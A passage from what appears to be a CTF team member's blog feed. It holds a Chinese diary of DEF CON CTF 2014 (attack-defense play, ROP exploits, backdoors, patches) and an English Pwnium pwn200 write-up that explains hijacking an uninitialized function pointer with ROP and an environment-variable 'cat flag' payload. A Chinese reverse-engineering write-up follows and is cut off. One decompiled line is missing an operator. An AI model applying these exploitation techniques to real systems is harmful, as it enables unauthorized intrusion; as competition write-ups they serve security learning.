&lt;img alt="IMG_1757.JPG" src="http://user-image.logdown.io/user/6149/blog/6156/post/220500/IJ1AfSDFRduOKnyl14Je_IMG_1757.JPG"&gt;  &lt;/p&gt;
&lt;h2&gt;8/7&lt;/h2&gt;
&lt;hr&gt;
&lt;p&gt;早上 alan 幫大家準備的早點&lt;br&gt;
吃一吃不知道誰提議要吃泡麵&lt;br&gt;
我帶的熱水壺就派上用場 XD&lt;br&gt;
吃完原本以為是要去樓下聽規則&lt;br&gt;
結果只是領取 badge 和一些大會贈品&lt;br&gt;
badge 是一塊...開發板 ?&lt;br&gt;
裡面似乎可以編寫自己的功能&lt;br&gt;
還有一些奇怪的模組 XD&lt;br&gt;
我對硬體不熟就沒研究了&lt;br&gt;
沒多久 alan 買完其他人的 badge&lt;br&gt;
大概有 20 幾個 ... 超扯 XD&lt;br&gt;
&lt;img alt="IMG_1766.JPG" src="http://user-image.logdown.io/user/6149/blog/6156/post/220500/Q6WB6yoSSTSIpK7eFW7y_IMG_1766.JPG"&gt;  &lt;/p&gt;
&lt;p&gt;接著我們下去買紀念 t-shirt 的攤位&lt;br&gt;
一路上都是排隊買票的隊伍&lt;br&gt;
長度快要突破天際啦~~~&lt;br&gt;
&lt;img alt="IMG_1770.JPG" src="http://user-image.logdown.io/user/6149/blog/6156/post/220500/0xO4c4xRQzWTtBvcJCrq_IMG_1770.JPG"&gt;&lt;br&gt;
到攤位才知道原來 t-shirt 有很多種&lt;br&gt;
樣式還滿好看的 不輸西門町一些潮T&lt;br&gt;
最有看頭的是白色醫生袍 XDDD&lt;br&gt;
穿上去實在很酷&lt;br&gt;
不過如果平常穿可能恥力要夠 XD&lt;br&gt;
因為帶的錢不夠&lt;br&gt;
只好先買了一件外套和 t-shirt&lt;br&gt;
外套要 $60 樣式很普通&lt;br&gt;
材質感覺不錯 穿起來很舒服&lt;br&gt;
&lt;img alt="IMG_1773.JPG" src="http://user-image.logdown.io/user/6149/blog/6156/post/220500/MDiHWTHESwispnHRXdCM_IMG_1773.JPG"&gt;  &lt;/p&gt;
&lt;p&gt;下午去逛 outlet&lt;br&gt;
orange &amp;amp; alan &amp;amp; me 搭導演的車&lt;br&gt;
其他人就搭車前往&lt;br&gt;
逛了半天結果我只買一隻冰淇淋來吃 XD&lt;br&gt;
其他人都各自有收穫&lt;br&gt;
回程順便去中國超市幫忙採購明天的早餐&lt;br&gt;
看到很多台灣的商品&lt;br&gt;
結帳時店員也是來自台灣&lt;br&gt;
還跟 alan 要電話 XD&lt;br&gt;
&lt;img alt="IMG_1804.JPG" src="http://user-image.logdown.io/user/6149/blog/6156/post/220500/aMIkfF4QESjWNzS6DltI_IMG_1804.JPG"&gt;  &lt;/p&gt;
&lt;p&gt;等大家都回到飯店後&lt;br&gt;
對明天比賽的戰術最後討論&lt;br&gt;
基本上有：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;檢查 gamebox 能用上的 wrapper&lt;/li&gt;
&lt;li&gt;上 wrapper&lt;/li&gt;
&lt;li&gt;上 script&lt;/li&gt;
&lt;li&gt;與外場 sync 資訊&lt;/li&gt;
&lt;li&gt;錯誤狀況 &amp;amp; SOP &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;討論持續到晚上一點多大家才休息&lt;br&gt;
主要是 wrapper 組要做的事情真的很多&lt;br&gt;
他們甚至省下 outlet 的行程趕工&lt;br&gt;
太強大了 &amp;lt;(_ _)&amp;gt;  &lt;/p&gt;
&lt;h1&gt;8/8&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;大家一大早就到樓下等著比賽開始&lt;br&gt;
看到很多之前只會在網路看到的隊伍&lt;br&gt;
感覺還滿奇妙的 XD&lt;br&gt;
大家進場後場外組和後援組就待在隔壁間&lt;br&gt;
透過事先建好的 ssh tunnel 操作&lt;br&gt;
我這邊負責建置的 script 沒遇到什麼問題&lt;br&gt;
ptrace 如預期的不能用&lt;br&gt;
wrapper 大部分都接了上去&lt;br&gt;
10 點正式開始&lt;br&gt;
開放兩個服務：&lt;code&gt;eliza&lt;/code&gt; and &lt;code&gt;wdub&lt;/code&gt;&lt;br&gt;
&lt;code&gt;eliza&lt;/code&gt; 簡單的說就是大航海時代宇宙版&lt;br&gt;
可以買賣東西賺錢這樣&lt;br&gt;
&lt;code&gt;wdup&lt;/code&gt; 是一個 http server&lt;br&gt;
不過由於只能透過 ctf.tw 存取&lt;br&gt;
沒有 browser 可用&lt;br&gt;
暫時就沒看這邊  &lt;/p&gt;
&lt;p&gt;一開始就不太順利&lt;br&gt;
&lt;strong&gt;wrapper 沒辦法通過主辦方的 service check&lt;/strong&gt;&lt;br&gt;
一開始就墊底 OTZ&lt;br&gt;
更慘的是 開賽兩小時後對外網路 gg&lt;br&gt;
&lt;strong&gt;帶來的 switch 對 vlan 999 的支援有問題&lt;/strong&gt;&lt;br&gt;
場內暫時用 4G 上網&lt;br&gt;
場外則完全無法連線&lt;br&gt;
還好 &lt;code&gt;eliza&lt;/code&gt; 是用 qemu 模擬 x86 的服務&lt;br&gt;
暫時還可以做離線分析&lt;br&gt;
這邊我試到可以控制 eip&lt;br&gt;
要開始寫 ROP 時&lt;br&gt;
場內也是進行到這步驟&lt;br&gt;
為了避免工作重疊就交給 sean 來寫 exploit&lt;br&gt;
在這邊我們場外組犯了一個錯誤&lt;br&gt;
&lt;strong&gt;看到 &lt;code&gt;wdup&lt;/code&gt; 有 html ， 一直以為&lt;code&gt;wdup&lt;/code&gt;是 web 題......&lt;/strong&gt;&lt;br&gt;
網路問題導至內外的資訊傳遞一直很緩慢&lt;br&gt;
一直到第二天快結束才反應過來&lt;br&gt;
超虧... &lt;code&gt;wdup&lt;/code&gt; 可能是我們掉最多分的一題  &lt;/p&gt;
&lt;p&gt;後來 GD 拿 thinkpad 接無線網卡暫時做為 router 使用&lt;br&gt;
讓場外組可以 access 內網 不過延遲很高...&lt;br&gt;
途中還有幾個突發狀況：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;內外網全死，疑似是有隊伍做 dos，應該是透過 &lt;code&gt;eliza&lt;/code&gt;，cpu 使用率很高&lt;/li&gt;
&lt;li&gt;peter 和 shik 嘗試解 badge 題，結果在燒一次版子要兩分鐘，中間剛好 service check XDD&lt;/li&gt;
&lt;li&gt;lucas 透過分析封包時發現 &lt;code&gt;eliza&lt;/code&gt; 根本沒有 DEP，不過此時 sean 也差不多完成 ROP exploit 了&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;過一段時間又開了一題 &lt;code&gt;imap&lt;/code&gt;&lt;br&gt;
顧名思義就是可以做 imap protocol 的各種操作&lt;br&gt;
這題的 flag 位置跟其他題都不同&lt;br&gt;
猜測是 owner 為 root 資料夾底下有個特殊的檔案&lt;br&gt;
此外資料夾底下還有登入用的 password&lt;br&gt;
由於 tunnel 實在很 lag&lt;br&gt;
我只好在手機上用 gdb 去 reverse 這題&lt;br&gt;
lucas 有發現可疑的流量&lt;br&gt;
有其他隊伍直接就登入、讀 flag 並結束連線&lt;br&gt;
前面完全沒有獲得帳密的過程&lt;br&gt;
由於沒有備份 flag 很難確認到底是不是被攻擊了&lt;br&gt;
但我猜測應該並沒有被攻陷&lt;br&gt;
因為此流量的來源隊伍名次較後&lt;br&gt;
如果有成功拿 flag 不應該如此&lt;br&gt;
這流量的產生有兩個可能：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;此主辦方的 service check&lt;/li&gt;
&lt;li&gt;此為其他隊伍混淆視聽的假流量&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;現在想想應該是第二個可能&lt;br&gt;
畢竟主辦方在有切 vlan 的情況下&lt;br&gt;
應該不會提供 service check 的流量  &lt;/p&gt;
&lt;p&gt;正當場外在研究 &lt;code&gt;imap&lt;/code&gt;時&lt;br&gt;
場內似乎發現有其他隊伍用 &lt;code&gt;eliza&lt;/code&gt; 的新漏洞來攻擊我們&lt;br&gt;
這個沒辦法透過 replay exploit 去獲得分數&lt;br&gt;
發生 exploit 需要遊戲金額到一定數量才能觸發&lt;br&gt;
物品和星球都是隨機生成&lt;br&gt;
所以必須先寫個自動賺錢外掛 XDD&lt;br&gt;
這邊就給 217 的 acm 大大去搞定  &lt;/p&gt;
&lt;p&gt;回到飯店後吃晚餐順便討論今天的戰況&lt;br&gt;
抱歉我完全不記得午餐和晚餐吃什麼.......OTZ&lt;br&gt;
比賽期間我們的名次在 4~8 名徘徊&lt;br&gt;
第一名由_韓國 ASRT_ 遙遙領先&lt;br&gt;
沒意外 &lt;code&gt;eliza&lt;/code&gt; 最早的 exploit 就是由他們寫出&lt;br&gt;
第二名則由 &lt;em&gt;men in blackhats&lt;/em&gt; 迎頭趕上&lt;br&gt;
第三名是 &lt;em&gt;ppp&lt;/em&gt;&lt;br&gt;
第四名 &lt;em&gt;blue-lotus&lt;/em&gt;&lt;br&gt;
我們暫居第五  &lt;/p&gt;
&lt;p&gt;討論完以後大家又繼續離線分析&lt;br&gt;
但是實在太累大家相繼睡去&lt;br&gt;
直到半夜又醒來解題 XDD&lt;br&gt;
dm4 給我了一個 &lt;code&gt;imap&lt;/code&gt; 可疑流量&lt;br&gt;
這次是真的可以 work !&lt;br&gt;
發現執行完 payload 以後&lt;br&gt;
可以用 &lt;code&gt;list&lt;/code&gt; 指令做任意路徑存取&lt;br&gt;
也就是可以得知使用者帳戶名稱及存放密碼的檔案&lt;br&gt;
由於密碼存放的資料夾和目錄是 666&lt;br&gt;
我瞬間念頭是可以透過其他 service 來存取這些檔案&lt;br&gt;
這個 payload 應該也只做到目前這樣&lt;br&gt;
後來 atdog 睡醒之後加入分析的行列&lt;br&gt;
眼尖的發現 payload 的檔名是用 &lt;code&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaa../&lt;/code&gt;&lt;br&gt;
但是這樣的路徑根本不會 work XD&lt;br&gt;
原來這邊是一個 BOF 造成的邏輯漏洞&lt;br&gt;
突破盲點後很快我們找出 exploit 的位置&lt;br&gt;
並由 dm4 寫出攻擊的 script&lt;br&gt;
另一邊 &lt;code&gt;eliza&lt;/code&gt; 也成功賺到足夠的 $$ 並寫出 exploit  &lt;/p&gt;
&lt;h2&gt;8/9&lt;/h2&gt;
&lt;hr&gt;
&lt;p&gt;第二天一早要進場但是被擋在外面要排隊&lt;br&gt;
最後要由隊長拿 token 讓 8 個人進去&lt;br&gt;
因此外場組就只能在外面等&lt;br&gt;
今天 GD 嘗試解決 vlan 999 的問題&lt;br&gt;
可惜還是無解  &lt;/p&gt;
&lt;p&gt;今天得知主辦方計分方面有問題&lt;br&gt;
重算我們的排名上升到第二！&lt;br&gt;
後來記分板就關閉了 只顯示排名&lt;br&gt;
中午開了新題目 &lt;code&gt;justify&lt;/code&gt;&lt;br&gt;
&lt;em&gt;dragon sector&lt;/em&gt; 有送可疑流量過來&lt;br&gt;
但是仔細檢查後根本與程式流程無關&lt;br&gt;
而且流出的 flag 也 match 不上備份的&lt;br&gt;
差不多這時間我們突然第一名了 XD&lt;br&gt;
應該要歸功於前面成功攻擊放的後門  &lt;/p&gt;
&lt;p&gt;兩點左右發現 &lt;code&gt;justify&lt;/code&gt; 被打了&lt;br&gt;
不過內場後來說已經 patch&lt;br&gt;
但是這邊又有溝通上的問題 QQ&lt;br&gt;
外場大概很早有發現漏洞的確切位置&lt;br&gt;
但是以為內場已經 patch 而沒有告知&lt;br&gt;
回飯店才知道內場的 patch 是其他問題&lt;br&gt;
靠 wrapper 一開始有守下幾波&lt;br&gt;
不過 &lt;em&gt;ppp&lt;/em&gt; 的 payload 也一直進化&lt;br&gt;
五點的時候 &lt;code&gt;justify&lt;/code&gt; 突然爛掉&lt;br&gt;
還原成最初版本也沒用&lt;br&gt;
後來確認是主辦方的問題 XD  &lt;/p&gt;
&lt;p&gt;差不多三點左右 &lt;code&gt;wdup&lt;/code&gt; 換新版本&lt;br&gt;
由於沒人分析 又是一陣手忙腳亂&lt;br&gt;
只 wrapper 擋在前面避免大量失分&lt;br&gt;
靠著 replay 從弱隊獲得一些分數&lt;br&gt;
好像還有隊伍用其他 service 在 tmp 建 link&lt;br&gt;
來繞過 &lt;code&gt;wdup&lt;/code&gt; 的限制  &lt;/p&gt;
&lt;p&gt;接近六點的時候 &lt;code&gt;eliza&lt;/code&gt; 換成 arm 的版本&lt;br&gt;
不過程式似乎沒有做改動&lt;br&gt;
我們很快就把 jump 的漏洞給補上&lt;br&gt;
btw, patch 的部分都是靠 jery 負責&lt;br&gt;
真的很強大 &amp;lt;(_ _)&amp;gt;&lt;br&gt;
6:37 &lt;code&gt;imap&lt;/code&gt; 也放出了第二個版本&lt;br&gt;
外場第一時間把檔案抓下來比對&lt;br&gt;
由於 ctf.tw 無法連外&lt;br&gt;
只能轉成 hex 再用 copy &amp;amp; paste 的方式拉出來 ...&lt;br&gt;
這次有小部分功能都改過&lt;br&gt;
不過 diff 過後很快就找到問題點在一個 decode base64 的 function&lt;br&gt;
lucas 說第一個版本也又這個 function&lt;br&gt;
但是沒有被呼叫到&lt;br&gt;
接下來到結束時間都在研究如何觸發這個漏洞  &lt;/p&gt;
&lt;p&gt;內場其實發生很多事情外場都不清楚 &amp;gt;&amp;lt;&lt;br&gt;
比如說  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主要得分來自前面種的後門&lt;/li&gt;
&lt;li&gt;&lt;code&gt;justify&lt;/code&gt; 持續掉分&lt;/li&gt;
&lt;li&gt;其他隊伍也有很多 wrapper 和 defense script，必須想辦法繞過&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這些場外其實都第一時間沒得到消息...&lt;br&gt;
很多狀況都是回飯店討論時才知道的&lt;br&gt;
即使用 skype 還是有些不方便  &lt;/p&gt;
&lt;p&gt;晚上大家實在太累了&lt;br&gt;
吃完飯都決定回去小寐一會兒才陸續起來解題&lt;br&gt;
我睡到凌晨 1 點...鬧鐘沒設完就睡著了 = =&lt;br&gt;
好險沒睡到隔天&lt;br&gt;
醒來 lucas 和 atdog 已經讓 &lt;code&gt;imapv2&lt;/code&gt; 會 stack smash&lt;br&gt;
但是似乎沒辦法繞過 stack guard&lt;br&gt;
jery 則是說已經還原數個 &lt;code&gt;justify&lt;/code&gt; struct&lt;br&gt;
可以分工去 reverse 程式&lt;br&gt;
此時我們才開始交流內外場對這題的進度&lt;br&gt;
知道這題是吃 DIMACS CNF format 格式的文件後&lt;br&gt;
分析進度開始加速了起來  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;217: 這就是一題 hrms  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;jery 則把漏洞給補上&lt;br&gt;
用一種很巧秒的方式 XD&lt;br&gt;
將整個 stack 移到 environment variable 的位置&lt;br&gt;
這樣即使 overflow 也只會蓋到環境變數  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;blue-lotus&lt;/em&gt;: 神思路! 太猥瑣了!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這題 patch 有一定難度&lt;br&gt;
很多隊伍只是把長度加大來騙人&lt;br&gt;
實際上只要改過 padding 長度依然可以 overflow&lt;br&gt;
可惜直到比賽我們最後還是沒有成功分析出 &lt;code&gt;justify&lt;/code&gt; 的演算法&lt;br&gt;
只能靠 replay 的方式重送&lt;br&gt;
也沒拿到什麼分數  &lt;/p&gt;
&lt;p&gt;至於其他兩題的進度&lt;br&gt;
sean 和 jeffxx 把 arm 版本的 &lt;code&gt;eliza&lt;/code&gt; 第二個漏洞給做出來&lt;br&gt;
&lt;code&gt;imapv2&lt;/code&gt; 可以對任意地址寫 1 byte&lt;br&gt;
但是找不到 memory leak 和可以利用的地方 OTZ  &lt;/p&gt;
&lt;h2&gt;8/10&lt;/h2&gt;
&lt;hr&gt;
&lt;p&gt;第三天大家莫名其妙又要排隊&lt;br&gt;
這次我們決定直接坐在沙發&lt;br&gt;
用無線網路存取內網 XD&lt;br&gt;
果然操作效率大幅提升阿!!!&lt;br&gt;
只可惜第三天真的太累了......&lt;br&gt;
沒辦法專注在分析 0 day&lt;br&gt;
分析 &lt;em&gt;ppp&lt;/em&gt; 的流量只看到一堆假流量毫無稍獲&lt;br&gt;
不過分析 &lt;em&gt;binja&lt;/em&gt; 、 &lt;em&gt;blue-lotus&lt;/em&gt;&lt;br&gt;
似乎都有嘗試對 &lt;code&gt;justify&lt;/code&gt; 發動攻擊&lt;br&gt;
另外 第三天 &lt;code&gt;wdup&lt;/code&gt; 還是有被攻擊成功&lt;br&gt;
由於第二天後半開始幾乎都是挨打的狀態&lt;br&gt;
不過修補及時 應該也沒有太大損害&lt;br&gt;
第三天沒有攻擊流量、也沒有分數排名&lt;br&gt;
(我看了螢幕三分鐘才發現是 replay ....  &lt;/p&gt;
&lt;p&gt;比賽就這樣平淡的結束了&lt;br&gt;
大家留下來拍照和聽主辦單位宣布一些事情&lt;br&gt;
也有跟其他隊伍稍微交流一下心得&lt;br&gt;
就回飯店休息了......實在是很累 = =&lt;br&gt;
睡到 4:30 以為是頒獎開始了 結果還沒&lt;br&gt;
只好回比賽場地繼續 social&lt;br&gt;
值得一提的是 &lt;em&gt;ghost in the shellcode&lt;/em&gt; 的成員來跟我們分享一些 CTF 的經驗&lt;br&gt;
他說自己已經比了 9 年&lt;br&gt;
隊伍花五年去弄出一套 framework 來幫助 CTF 競賽&lt;br&gt;
我們也跟他們提到 HITCON CTF&lt;br&gt;
說題目還沒出完&lt;br&gt;
他也回說完全了解出題的痛苦 XD&lt;br&gt;
&lt;img alt="IMG_1813.JPG" src="http://user-image.logdown.io/user/6149/blog/6156/post/220500/KTP0zJmeRyezvahV3trC_IMG_1813.JPG"&gt;  &lt;/p&gt;
&lt;p&gt;最後閉幕式在半夢半醒中度過&lt;br&gt;
聽到 &lt;em&gt;dragon sector&lt;/em&gt; 的名字我嚇了一大跳&lt;br&gt;
想說如果他們反超到第一名 那我們就死定啦&lt;br&gt;
第三天很多都是他們對我們發動攻擊 = =&lt;br&gt;
還好他們是第三 我們第二 &lt;em&gt;ppp&lt;/em&gt; 還是保持在第一&lt;br&gt;
跟第二天的名次完全一樣 XD&lt;br&gt;
插曲是因為宣布名次時攝影大哥剛好去上廁所&lt;br&gt;
在後面罵一聲 &lt;strong&gt;幹!!!&lt;/strong&gt; XDDD&lt;br&gt;
&lt;img alt="IMG_1815.JPG" src="http://user-image.logdown.io/user/6149/blog/6156/post/220500/BHzsEqRruLGYt3kQUZ3A_IMG_1815.JPG"&gt;  &lt;/p&gt;
&lt;p&gt;晚餐吃了奇怪的中式合菜&lt;br&gt;
除了那道青菜以外吃起來都不錯&lt;br&gt;
吃完大家都回去休息了&lt;br&gt;
sean &amp;amp; jeffxx &amp;amp; peter &amp;amp; me 四個人開始玩世紀二 XDD&lt;br&gt;
中間還發生 virtual box 跟 guest os 和 host 無縫接軌的神奇畫面...&lt;br&gt;
不過我真的玩得很爛 = =&lt;br&gt;
被改強的電腦打爆兩次&lt;br&gt;
最後一場改打塔快和城快結果電腦瞬間被虐爆....  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sean: 怎麼差這麼多? 遊戲做壞了吧  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;之後改玩小遊戲...打了 40 幾分鐘&lt;br&gt;
打到兩邊都不想玩了 = =&lt;br&gt;
最後吃一碗泡麵做為一天的結束  &lt;/p&gt;
&lt;h2&gt;8/11&lt;/h2&gt;
&lt;hr&gt;
&lt;p&gt;最後一天早上在飯店聊天&lt;br&gt;
因為沒有微波爐可以熱昨天的炒飯&lt;br&gt;
只好很克難的吹風機加熱 XDDD&lt;br&gt;
親眼見證了 lucas 被 GD + dm4 的聯手推坑&lt;br&gt;
買完大家就在飯店裡玩 boss 耳機 XDD&lt;br&gt;
後來 alan 也買了一個  &lt;/p&gt;
&lt;p&gt;下午的行程大致就是...&lt;br&gt;
逛街逛到腿軟&lt;br&gt;
死觀光客模式快門按不停&lt;br&gt;
溫蒂漢堡很難吃&lt;br&gt;
搭飛機回家&lt;br&gt;
就不詳細贅述細節了  &lt;/p&gt;
&lt;p&gt;幹&lt;br&gt;
原本要傳 defcon 閉幕式的照片做結尾&lt;br&gt;
可是免費帳號不能傳照片了 = =  &lt;/p&gt;</content><category term="DEF CON CTF"></category></entry><entry><title>Pwnium CTF 2014 pwn 200 Be a robot</title><link href="https://ddaa.tw/pwnium_pwn_200_be_a_robot.html" rel="alternate"></link><published>2014-07-11T22:59:00+08:00</published><updated>2014-07-11T22:59:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-07-11:/pwnium_pwn_200_be_a_robot.html</id><summary type="html">&lt;p&gt;Pwnium CTF....but there is only one pwn problem. lol&lt;br&gt;
(pwn100 was down.)  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The problem gave us a host that we can login by ssh and do something.&lt;br&gt;
Our goal is using the executable named &lt;code&gt;pwn200&lt;/code&gt; to get the content of file named &lt;code&gt;flag&lt;/code&gt; under the same directory.  &lt;/p&gt;
&lt;p&gt;After using …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Pwnium CTF....but there is only one pwn problem. lol&lt;br&gt;
(pwn100 was down.)  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The problem gave us a host that we can login by ssh and do something.&lt;br&gt;
Our goal is using the executable named &lt;code&gt;pwn200&lt;/code&gt; to get the content of file named &lt;code&gt;flag&lt;/code&gt; under the same directory.  &lt;/p&gt;
&lt;p&gt;After using IDA to reverse the elf, we can find the vulnerability is in the fucntion &lt;code&gt;atExit()&lt;/code&gt;.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="kr"&gt;__cdecl&lt;/span&gt; &lt;span class="nf"&gt;atExit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;signed&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;v2&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// [sp+Ch] [bp-Ch]@0&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
      &lt;span class="n"&gt;v2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;kid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;v2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;adult&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;v2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;man&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;v2&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If we input a negative number, the elf won't initialize the variable &lt;code&gt;v2&lt;/code&gt;.&lt;br&gt;
Therefore, we can control eax and execute arbitrary code.  &lt;/p&gt;
&lt;p&gt;We can't jump to shellcode easily because of ASLR protection.&lt;br&gt;
However, the program provide a magic function &lt;code&gt;test()&lt;/code&gt; which call &lt;code&gt;system()&lt;/code&gt; and just print &lt;code&gt;hacked&lt;/code&gt;.&lt;br&gt;
We can use ROP to do something to read flag.&lt;br&gt;
With no difficulty, I found the ROP chain to call system and controll &lt;code&gt;esp&lt;/code&gt; to change the argument.&lt;br&gt;
But where can I put the command to get flag ? I stuck in tis problem for a while.&lt;br&gt;
Finally, I used the environment variable to solve the problem.&lt;br&gt;
Set an environment variable as &lt;code&gt;cat flag&lt;/code&gt; with a lot of blanks. Like that:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;DDAA=" "*130000 + "cat flag"&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Then we can guess the address of our environment variable. &lt;br&gt;
It must be between &lt;code&gt;cat&lt;/code&gt; and &lt;code&gt;=&lt;/code&gt;.&lt;br&gt;
Once it was right in our guess, we can see the flag of pwn200.  &lt;/p&gt;</content><category term="Other CTF"></category><category term="Uninitialized"></category></entry><entry><title>Secuinside ctf 2014 reverse 100 find key</title><link href="https://ddaa.tw/secuinside_reverse_100_find_the_key.html" rel="alternate"></link><published>2014-06-09T02:46:00+08:00</published><updated>2014-06-09T02:46:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-06-09:/secuinside_reverse_100_find_the_key.html</id><summary type="html">&lt;p&gt;這題是快要結束才開出來的一題 reverse&lt;br&gt;
到結束也沒人解出來 ORZ&lt;br&gt;
稱假日有點時間還是把它解出來了...  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目是一個 32 bit 的 elf&lt;br&gt;
執行需要輸入兩個參數&lt;br&gt;
題目會先對第一個參數做檢查  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;./findkey 123 123&lt;br&gt;
key 1 = 123&lt;br&gt;
0 is differnce&lt;br&gt;
Wrong password  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;很快找到檢查第一個參數的 function 在 &lt;code&gt;0x0804b76d&lt;/code&gt;&lt;br&gt;
trace 完後這個 func 的演算法是：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def sub_804b76d(arg1,n=0x31):
    for i in range(56):
        v7 = 0
        v4 = len(sentence[i])
        v2 = smaller(n …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;這題是快要結束才開出來的一題 reverse&lt;br&gt;
到結束也沒人解出來 ORZ&lt;br&gt;
稱假日有點時間還是把它解出來了...  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目是一個 32 bit 的 elf&lt;br&gt;
執行需要輸入兩個參數&lt;br&gt;
題目會先對第一個參數做檢查  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;./findkey 123 123&lt;br&gt;
key 1 = 123&lt;br&gt;
0 is differnce&lt;br&gt;
Wrong password  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;很快找到檢查第一個參數的 function 在 &lt;code&gt;0x0804b76d&lt;/code&gt;&lt;br&gt;
trace 完後這個 func 的演算法是：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def sub_804b76d(arg1,n=0x31):
    for i in range(56):
        v7 = 0
        v4 = len(sentence[i])
        v2 = smaller(n,v4)

        for j in range(v2):
            v7 += (ord(sentence[i][j]) * ord(arg1[j]))
            j+=1

        if v7 != dword_804F180[i]:
            print &amp;quot;%d is difference&amp;quot; % i
            return
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;程式中存了 56 個字串&lt;br&gt;
會依序取得每個字元與 &lt;code&gt;argv[1]&lt;/code&gt; 相乘並加總&lt;br&gt;
並檢查結果是否如預期&lt;br&gt;
看起來很複雜&lt;br&gt;
其實就是國中的數學 多元一次方程式 XD&lt;br&gt;
給 56 個方程式解 49 個未知數這樣&lt;br&gt;
但是這邊一開始卡關了&lt;br&gt;
逐一檢查後才發現&lt;br&gt;
由於字串中有幾個 byte 是特殊字元&lt;br&gt;
那邊在程式中的加總結果與我模擬的不同&lt;br&gt;
原因我沒有深究~ 反正只要有 49 個方程式就能解了&lt;br&gt;
把那幾個扣掉後依然可以得到解&lt;br&gt;
&lt;code&gt;3 lroea5 r tfmh0wl1y15on 3y! 4n 50r,30wv3r !4kwi&lt;/code&gt;&lt;br&gt;
也就是第一個參數  &lt;/p&gt;
&lt;p&gt;通過第一階段以後&lt;br&gt;
剩下的頗複雜 Orz&lt;br&gt;
很多 function 亂 call&lt;br&gt;
還有很多根本沒做事情 = =&lt;br&gt;
只好用動態分析的方式檢查 function 在做啥&lt;br&gt;
&lt;code&gt;sub_8048A32&lt;/code&gt; 和 &lt;code&gt;sub_8048A58&lt;/code&gt; 作用不明&lt;br&gt;
不負責任猜測可能是類似 &lt;code&gt;malloc&lt;/code&gt; 和 &lt;code&gt;free&lt;/code&gt; 的動作&lt;br&gt;
程式流程如下：  &lt;/p&gt;
